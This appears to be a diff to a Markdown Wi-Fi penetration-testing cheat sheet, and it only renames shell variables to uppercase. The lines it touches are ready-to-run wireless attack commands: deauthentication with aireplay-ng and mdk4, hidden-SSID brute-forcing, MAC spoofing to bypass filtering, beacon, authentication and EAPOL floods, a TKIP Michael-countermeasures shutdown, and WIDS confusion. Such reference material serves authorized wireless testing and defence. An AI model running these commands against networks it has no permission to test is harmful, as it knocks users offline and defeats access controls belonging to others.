@@ -59,7 +59,7 @@ When ESSID = `<length: 0>`, the SSID is hidden.
 ::: code-group
 
 ```bash [airodump-ng]
-airodump-ng $interface -c $channel --bssid $bssid -w capture
+airodump-ng $INTERFACE -c $CHANNEL --bssid $BSSID -w capture
 ```
 
 ```bash [angryoxide]
@@ -71,23 +71,23 @@ angryoxide -i wlan0mon --notransmit
 - **Active method** - Deauth attack, force a client to reconnect:
 
 ```bash
-aireplay-ng -0 2 -a $bssid -c $client_mac -D $interface
+aireplay-ng -0 2 -a $BSSID -c $CLIENT_MAC -D $INTERFACE
 ```
 
 ### Brute-force SSID (Short SSIDs)
 
 ```bash
 # Full brute-force with uppercase characters only
-mdk4 $interface p -b u -c 1 -t $bssid
+mdk4 $INTERFACE p -b u -c 1 -t $BSSID
 
 # Brute-force with uppercase and digits
-mdk4 $interface p -b u,n -t $bssid
+mdk4 $INTERFACE p -b u,n -t $BSSID
 
 # Character sets: u (uppercase), n (digits), a (all), c (mixed case), m (mixed+numbers)
-mdk4 $interface p -b u,l,n -t $bssid
+mdk4 $INTERFACE p -b u,l,n -t $BSSID
 
 # Test SSIDs from a wordlist
-mdk4 $interface p -f /opt/wordlist.txt -t $bssid
+mdk4 $INTERFACE p -f /opt/wordlist.txt -t $BSSID
 ```
 
 ## 🛡️ MAC Filtering Bypass
@@ -101,12 +101,12 @@ If an AP uses MAC filtering, you can spoof an authorized client's MAC address to
 
 ```bash
 # Show current MAC address
-macchanger $interface
+macchanger $INTERFACE
 
 # Spoof to a specific MAC (interface must be down)
-ip link set $interface down
-macchanger -m $authorized_mac $interface
-ip link set $interface up
+ip link set $INTERFACE down
+macchanger -m $AUTHORIZED_MAC $INTERFACE
+ip link set $INTERFACE up
 ```
 
 3. **Deauthenticate the legitimate client** to force it to reconnect (and possibly free up the AP).
@@ -114,11 +114,11 @@ ip link set $interface up
 ::: code-group
 
 ```bash [aireplay-ng]
-aireplay-ng -0 1 -a $bssid -c $authorized_mac $interface
+aireplay-ng -0 1 -a $BSSID -c $AUTHORIZED_MAC $INTERFACE
 ```
 
 ```bash [mdk4]
-mdk4 $interface d -b $bssid -c $authorized_mac -h $authorized_mac
+mdk4 $INTERFACE d -b $BSSID -c $AUTHORIZED_MAC -h $AUTHORIZED_MAC
 ```
 
 :::
@@ -135,10 +135,10 @@ Floods the air with fake beacon frames, creating hundreds of fake APs. Can satur
 
 ```bash
 # Generate 1000 beacons per second with SSID "FakeAP"
-mdk4 $interface b -n "FakeAP" -s 1000
+mdk4 $INTERFACE b -n "FakeAP" -s 1000
 
 # Randomize SSIDs (characters: uppercase, lowercase, digits)
-mdk4 $interface b -n "FakeAP" -s 1000 -r
+mdk4 $INTERFACE b -n "FakeAP" -s 1000 -r
 ```
 
 ### Authentication DoS
@@ -147,10 +147,10 @@ Sends massive authentication requests to the target AP, saturating its ability t
 
 ```bash
 # Flood AP with authentication requests
-mdk4 $interface a -a $bssid -s 500
+mdk4 $INTERFACE a -a $BSSID -s 500
 
 # Use a random source MAC to avoid filtering
-mdk4 $interface a -a $bssid -s 500 -m
+mdk4 $INTERFACE a -a $BSSID -s 500 -m
 ```
 
 ### Deauth / Disassoc
@@ -159,10 +159,10 @@ Mass-deauthenticates all clients from an AP. More aggressive than `aireplay-ng`.
 
 ```bash
 # Deauth all clients on the target AP
-mdk4 $interface d -b $bssid -c $channel
+mdk4 $INTERFACE d -b $BSSID -c $CHANNEL
 
 # Deauth a specific client
-mdk4 $interface d -b $bssid -c $client_mac -h $client_mac
+mdk4 $INTERFACE d -b $BSSID -c $CLIENT_MAC -h $CLIENT_MAC
 ```
 
 ### Michael Exploit (TKIP)
@@ -171,7 +171,7 @@ Triggers Michael Countermeasures on APs using TKIP (WPA/WPA2). The AP will shut 
 
 ```bash
 # Force Michael Countermeasures on the target AP
-mdk4 $interface m -t $bssid -j
+mdk4 $INTERFACE m -t $BSSID -j
 ```
 
 ### EAPOL Flood
@@ -180,10 +180,10 @@ Floods the AP with EAPOL Start frames, saturating it with fake sessions, making 
 
 ```bash
 # Flood AP with EAPOL Start frames
-mdk4 $interface e -t $bssid -s 500
+mdk4 $INTERFACE e -t $BSSID -s 500
 
 # Also send EAPOL Logoff frames to disconnect clients
-mdk4 $interface e -t $bssid -s 500 -l
+mdk4 $INTERFACE e -t $BSSID -s 500 -l
 ```
 
 ### WIDS Confusion
@@ -192,10 +192,10 @@ Abuses WDS (Wireless Distribution System) to confuse WIDS/WIPS systems by making
 
 ```bash
 # Confuse WIDS with fake cross-AP connections
-mdk4 $interface w -e "MySSID" -z
+mdk4 $INTERFACE w -e "MySSID" -z
 
 # Specify the target BSSID
-mdk4 $interface w -b $bssid -e "MySSID" -z
+mdk4 $INTERFACE w -b $BSSID -e "MySSID" -z
 ```
 
 > **Note**: The `-z` flag activates the exploit that authenticates WDS clients on foreign APs, increasing confusion.
